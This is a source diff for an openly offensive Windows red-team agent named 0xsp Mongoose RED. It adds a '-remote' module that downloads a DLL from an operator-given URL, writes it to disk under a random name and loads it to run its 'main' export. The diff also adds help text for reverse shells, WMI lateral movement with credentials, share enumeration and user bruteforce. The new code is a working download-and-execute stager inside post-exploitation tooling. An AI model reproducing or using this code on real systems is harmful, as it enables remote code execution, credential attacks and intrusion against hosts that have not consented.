@@ -8,7 +8,7 @@
 | | | |( (_) )| ( ) |( (_) |( (_) )( (_) )\__, \(  ___/
 (_) (_)`\___/'(_) (_)`\__  |`\___/'`\___/'(____/`\____)
                      ( )_) |
-                      \___/' RED 2.1
+                      \___/' RED 2.2
 
  * Source is provided to this software because we believe users have a     *
  * right to know exactly what a program is going to do before they run it. *
@@ -118,6 +118,7 @@ type
     procedure http_cmdlet;virtual;
     procedure Acc_BF;virtual;
     procedure ex_code;virtual;
+    procedure remote_lib;virtual;
 
   end;
 
@@ -139,7 +140,7 @@ var
   ErrorMsg: String;
 begin
   // quick check parameters
-  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce');
+  ErrorMsg:=CheckOptions('h s u i p n c l d e w o x m t r username password host lr nds srvhost interactive cmd bf domain import remote', 'help services userinfo systeminfo programs networking configs lookup downloadfile exploits acl host secretkey mongoose transfer runas bruteforce');
   if ErrorMsg<>'' then begin
     ShowException(Exception.Create(ErrorMsg));
     Terminate;
@@ -213,6 +214,9 @@ begin
   //
   ex_code;
   end;
+  if hasoption('remote') then begin
+  remote_lib;
+  end;
   if hasoption('m','mongoose') then begin
      systeminfo;
      userinfo;
@@ -263,7 +267,6 @@ FPHTTPClient.AllowRedirect := True;
    except
       on E: exception do
          writeln(E.Message);
-
    end;
 FPHTTPClient.Free;
 
@@ -703,12 +706,62 @@ var
  GetWin32_ProcessInfo;
  end;
 
+
+procedure Tmongoose.remote_lib;
+var
+ remote_addr,s:string;
+ dll_data:RawByteString;
+ i:integer;
+ AMemStr,AMemStr2 : TMemoryStream;
+ AStrStr: TStringStream;
+ l_dll:string;
+
+begin
+  writeln('<*> Remote Dynamic Link Library launcher ');
+  writeln('[!] by using this module you can load DLL files Locally ');
+  writeln('[!] it also loads defined exports titled as `main` ');
+  writeln('[!] usage: agent.exe -remote http://host/lib.dll');
+
+for i := 0 to paramcount do begin
+ if (paramstr(i)='-remote') then begin
+    remote_addr := paramstr(i+1);
+ end;
+ end;
+
+   if ParamCount > 1 then begin
+dll_data := fetchplugin(remote_addr);
+
+AMemStr := TMemoryStream.Create;
+AmemStr.Write(dll_data[1],length(dll_data) * sizeof(dll_data[1]));
+AMemStr.Position := 0;
+
+
+AStrStr := TStringStream.Create('');
+AStrStr.Size := AMemStr.Size;
+AStrStr.CopyFrom(AMemStr, AMemStr.Size);
+AStrStr.Position := 0;
+
+s := AStrStr.DataString;
+AMemStr2 := TMemoryStream.Create;
+AMemStr2.SetSize(AStrStr.Size);
+AMemStr2.Write(s[1], length(s) * sizeof(s[1]));
+Randomize;
+l_dll := IntToHex(Random(Int64($7ffffffff)), 8);
+AMemStr2.SaveToFile(getcurrentdir+'\'+l_dll+'.dll');
+
+load_library(getcurrentdir+'\'+l_dll+'.dll');
+
+end;
+ end;
 procedure Tmongoose.ex_code;
 var
  dll_name:string;
  i:integer;
  begin
- writeln('<*> Dyn Link Library launcher Module ');
+ writeln('<*> Local Dynamic Link Library launcher ');
+ writeln('[!] by using this module you can load DLL files Locally ');
+ writeln('[!] it also loads defined exports titled as `main` ');
+ writeln('[!] usage: agent.exe -import lib.dll');
 
    for i := 0 to paramcount do begin
      if (paramstr(i)= '-import') then begin
@@ -1005,7 +1058,7 @@ begin
   os := osver;     //retrieve operating system  os
   po :=' No ! ';
   writeln(''+
-  #013#010'[->] 0xsp Mongoose Windows Red 2.1.0(x86) '#013#010'[>] Lawrence Amer(@zux0x3a) '#013#010'[>] https://0xsp.com'#013#010''+
+  #013#010'[->] 0xsp Mongoose Windows RED 2.2.0 '#013#010'[>] Lawrence Amer(@zux0x3a) '#013#010'[>] https://0xsp.com'#013#010''+
     #013#010'^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^'
   );
   list := Tstringlist.Create;
@@ -1239,7 +1292,9 @@ begin
   Writeln('-d',' --download Files directly into target machine.');
   Writeln('-t',' --upload Files From target machine into node js application.');
   Writeln('-m',' --run all known scan Types together.');
-
+  writeln(' ' );
+  writeln('[!] RED TEAMING TACTICS SECTION ');
+  writeln (' ');
   writeln('-r',' --spawn a reverse shell with specific account.');
   writeln('-lr',' --Lateral movement technique using WMI (e.g -lr -host 192.168.14.1 -username administrator -password blabla -srvhost nodejsip )');
   writeln('-nds',' --network discovery and share enumeration ');
@@ -1249,6 +1304,9 @@ begin
   writeln('-password',' --identity authentication for specific attack modules.');
   writeln('-host',' --identify remote host to conduct an attack to.');
   writeln('-srvhost',' --set rhost of node js application.');
+  writeln('-bf',' --local users / domain users bruteforce module ');
+  writeln('-import',' --import and execute dll file locally ');
+  writeln('-remote',' --import and execute dll file from remote host ');
 
 end;
 
